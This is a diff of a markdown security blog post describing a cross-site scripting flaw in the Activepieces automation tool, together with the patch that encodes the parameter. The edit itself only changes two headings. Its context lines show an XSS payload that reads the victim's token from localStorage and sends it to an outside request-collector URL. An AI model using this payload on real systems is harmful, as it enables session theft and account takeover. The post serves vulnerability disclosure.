@@ -9,7 +9,7 @@ permalink: /bloghub/xss-on-steroids/
 
 {% raw %} 
 
-# XSS on Steroids | Gaining Unauthenticated Access
+## Introduction  
 
 [Activepieces](https://www.activepieces.com/) is an open-source business automation tool, aka the open-source alternative for *Zapier*, which helps individuals automate flows and their work in a flexible UI environment without the need to write code, for example, you can build automation with *Activepieces* to send a Slack notification for each new Trello card.  
 
@@ -111,7 +111,7 @@ test' },'*')} else alert('poc');//
 test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '[https://](https://enxwjqx3bxw4.x.pipedream.net/)<your server>' + localStorage.getItem('token'));xhr.send(); }//
 ```
 
-### Patch
+## Patch
 
 The vulnerability was mitigated by passing the *params[’code’]* to `encodeURIComponent()`. 
 
